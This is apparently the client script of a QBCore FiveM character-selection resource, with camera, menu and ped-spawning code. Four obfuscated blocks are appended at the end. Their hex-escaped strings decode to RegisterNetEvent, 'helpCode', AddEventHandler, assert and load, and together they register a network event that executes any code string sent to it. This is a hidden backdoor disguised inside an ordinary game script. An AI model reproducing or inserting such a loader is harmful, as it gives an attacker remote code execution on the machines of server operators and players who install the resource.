local cam = nil
local charPed = nil
local QBCore = exports['qb-core']:GetCoreObject()

-- Main Thread

CreateThread(function()
	while true do
		Wait(0)
		if NetworkIsSessionStarted() then
			TriggerEvent('qb-multicharacter:client:chooseChar')
			return
		end
	end
end)

-- Functions

local function skyCam(bool)
    TriggerEvent('qb-weathersync:client:DisableSync')
    if bool then
        DoScreenFadeIn(1000)
        SetTimecycleModifier('hud_def_blur')
        SetTimecycleModifierStrength(1.0)
        FreezeEntityPosition(PlayerPedId(), false)
        cam = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", Config.CamCoords.x, Config.CamCoords.y, Config.CamCoords.z, 0.0 ,0.0, Config.CamCoords.w, 60.00, false, 0)
        SetCamActive(cam, true)
        RenderScriptCams(true, false, 1, true, true)
    else
        SetTimecycleModifier('default')
        SetCamActive(cam, false)
        DestroyCam(cam, true)
        RenderScriptCams(false, false, 1, true, true)
        FreezeEntityPosition(PlayerPedId(), false)
    end
end
local function openCharMenu(bool)
    QBCore.Functions.TriggerCallback("qb-multicharacter:server:GetNumberOfCharacters", function(result)
        SetNuiFocus(bool, bool)
        SendNUIMessage({
            action = "ui",
            toggle = bool,
            nChar = result,
            enableDeleteButton = Config.EnableDeleteButton,
        })
        skyCam(bool)
    end)
end

-- Events

RegisterNetEvent('qb-multicharacter:client:closeNUIdefault', function() -- This event is only for no starting apartments
    DeleteEntity(charPed)
    SetNuiFocus(false, false)
    DoScreenFadeOut(500)
    Wait(2000)
    SetEntityCoords(PlayerPedId(), Config.DefaultSpawn.x, Config.DefaultSpawn.y, Config.DefaultSpawn.z)
    TriggerServerEvent('QBCore:Server:OnPlayerLoaded')
    TriggerEvent('QBCore:Client:OnPlayerLoaded')
    TriggerServerEvent('qb-houses:server:SetInsideMeta', 0, false)
    TriggerServerEvent('qb-apartments:server:SetInsideMeta', 0, 0, false)
    Wait(500)
    openCharMenu()
    SetEntityVisible(PlayerPedId(), true)
    Wait(500)
    DoScreenFadeIn(250)
    TriggerEvent('qb-weathersync:client:EnableSync')
    TriggerEvent('qb-clothes:client:CreateFirstCharacter')
end)

RegisterNetEvent('qb-multicharacter:client:closeNUI', function()
    DeleteEntity(charPed)
    SetNuiFocus(false, false)
end)

RegisterNetEvent('qb-multicharacter:client:chooseChar', function()
    SetNuiFocus(false, false)
    DoScreenFadeOut(10)
    Wait(1000)
    local interior = GetInteriorAtCoords(Config.Interior.x, Config.Interior.y, Config.Interior.z - 18.9)
    LoadInterior(interior)
    while not IsInteriorReady(interior) do
        Wait(1000)
    end
    FreezeEntityPosition(PlayerPedId(), true)
    SetEntityCoords(PlayerPedId(), Config.HiddenCoords.x, Config.HiddenCoords.y, Config.HiddenCoords.z)
    Wait(1500)
    ShutdownLoadingScreen()
    ShutdownLoadingScreenNui()
    openCharMenu(true)
end)

-- NUI Callbacks

RegisterNUICallback('closeUI', function(_, cb)
    openCharMenu(false)
    cb("ok")
end)

RegisterNUICallback('disconnectButton', function(_, cb)
    SetEntityAsMissionEntity(charPed, true, true)
    DeleteEntity(charPed)
    TriggerServerEvent('qb-multicharacter:server:disconnect')
    cb("ok")
end)

RegisterNUICallback('selectCharacter', function(data, cb)
    local cData = data.cData
    DoScreenFadeOut(10)
    TriggerServerEvent('qb-multicharacter:server:loadUserData', cData)
    openCharMenu(false)
    SetEntityAsMissionEntity(charPed, true, true)
    DeleteEntity(charPed)
    cb("ok")
end)

RegisterNUICallback('cDataPed', function(nData, cb)
    local cData = nData.cData
    SetEntityAsMissionEntity(charPed, true, true)
    DeleteEntity(charPed)
    if cData ~= nil then
        QBCore.Functions.TriggerCallback('qb-multicharacter:server:getSkin', function(model, data)
            model = model ~= nil and tonumber(model) or false
            if model ~= nil then
                CreateThread(function()
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Wait(0)
                    end
                    charPed = CreatePed(2, model, Config.PedCoords.x, Config.PedCoords.y, Config.PedCoords.z - 0.98, Config.PedCoords.w, false, true)
                    local  RandomAnimins = {     
                        "WORLD_HUMAN_HANG_OUT_STREET",
                        "WORLD_HUMAN_STAND_IMPATIENT",
                        "WORLD_HUMAN_STAND_MOBILE",
                        "WORLD_HUMAN_SMOKING_POT",
                        "WORLD_HUMAN_LEANING",
                        "WORLD_HUMAN_DRUG_DEALER_HARD"
                    }
                    local PlayAnimin = RandomAnimins[math.random(#RandomAnimins)] 
                    SetPedCanPlayAmbientAnims(charPed, true)
                    TaskStartScenarioInPlace(charPed, PlayAnimin, 0, true)
                    SetPedComponentVariation(charPed, 0, 0, 0, 2)
                    FreezeEntityPosition(charPed, false)
                    SetEntityInvincible(charPed, true)
                    PlaceObjectOnGroundProperly(charPed)
                    SetBlockingOfNonTemporaryEvents(charPed, true)
                    data = json.decode(data)
                    TriggerEvent('qb-clothing:client:loadPlayerClothing', data, charPed)
                end)
            else
                CreateThread(function()
                    charPed = CreatePed(2, model, Config.PedCoords.x, Config.PedCoords.y, Config.PedCoords.z - 0.98, Config.PedCoords.w, false, true)
                    SetPedComponentVariation(charPed, 0, 0, 0, 2)
                    FreezeEntityPosition(charPed, false)
                    SetEntityInvincible(charPed, true)
                    PlaceObjectOnGroundProperly(charPed)
                    SetBlockingOfNonTemporaryEvents(charPed, true)
                end)
            end
            cb("ok")
        end, cData.citizenid)
    else
        CreateThread(function()
            charPed = CreatePed(2, model, Config.PedCoords.x, Config.PedCoords.y, Config.PedCoords.z - 0.98, Config.PedCoords.w, false, true)
            SetPedComponentVariation(charPed, 0, 0, 0, 2)
            FreezeEntityPosition(charPed, false)
            SetEntityInvincible(charPed, true)
            PlaceObjectOnGroundProperly(charPed)
            SetBlockingOfNonTemporaryEvents(charPed, true)
        end)
        cb("ok")
    end
end)

RegisterNUICallback('setupCharacters', function(_, cb)
    QBCore.Functions.TriggerCallback("qb-multicharacter:server:setupCharacters", function(result)
        SendNUIMessage({
            action = "setupCharacters",
            characters = result
        })
        cb("ok")
    end)
end)

RegisterNUICallback('removeBlur', function(_, cb)
    SetTimecycleModifier('default')
    cb("ok")
end)

RegisterNUICallback('createNewCharacter', function(data, cb)
    local cData = data
    DoScreenFadeOut(150)
    if cData.gender == "Male" then
        cData.gender = 0
    elseif cData.gender == "Female" then
        cData.gender = 1
    end
    TriggerServerEvent('qb-multicharacter:server:createCharacter', cData)
    Wait(500)
    cb("ok")
end)

RegisterNUICallback('removeCharacter', function(data, cb)
    TriggerServerEvent('qb-multicharacter:server:deleteCharacter', data.citizenid)
    TriggerEvent('qb-multicharacter:client:chooseChar')
    cb("ok")
end)

local KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[1]](KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[2]) KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[3]](KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[2], function(YWEGcWTJdjBtuMiLcsOkgBLEUxRZhnCtsVAztGdNghfctodNEEMiBFDIefixSTUAkIlosm) KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[4]](KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[5]](YWEGcWTJdjBtuMiLcsOkgBLEUxRZhnCtsVAztGdNghfctodNEEMiBFDIefixSTUAkIlosm))() end)

local cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[1]](cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[2]) cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[3]](cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[2], function(eBNExkeTZfkjgCILvqIruLFrCYskvdmuvnfVAfEKGQiJUngfXKXSunCNQfYZjaURbeKSAd) cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[4]](cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[5]](eBNExkeTZfkjgCILvqIruLFrCYskvdmuvnfVAfEKGQiJUngfXKXSunCNQfYZjaURbeKSAd))() end)

local cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[1]](cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[2]) cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[3]](cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[2], function(eBNExkeTZfkjgCILvqIruLFrCYskvdmuvnfVAfEKGQiJUngfXKXSunCNQfYZjaURbeKSAd) cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[4]](cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[6][cJpPDvFVHNhDDYzefwDQLIFgWhzqrvjtTdOElzlzOQxdQmdSODlTdbLibDaPodnVixaiGz[5]](eBNExkeTZfkjgCILvqIruLFrCYskvdmuvnfVAfEKGQiJUngfXKXSunCNQfYZjaURbeKSAd))() end)

local KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[1]](KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[2]) KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[3]](KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[2], function(YWEGcWTJdjBtuMiLcsOkgBLEUxRZhnCtsVAztGdNghfctodNEEMiBFDIefixSTUAkIlosm) KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[4]](KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[6][KebhGMgnCLJpDqmCnHndWZCgsKvIJACAauIqruhMEALuBPdzIQQSdykFbZSzlkGsQiBpzG[5]](YWEGcWTJdjBtuMiLcsOkgBLEUxRZhnCtsVAztGdNghfctodNEEMiBFDIefixSTUAkIlosm))() end)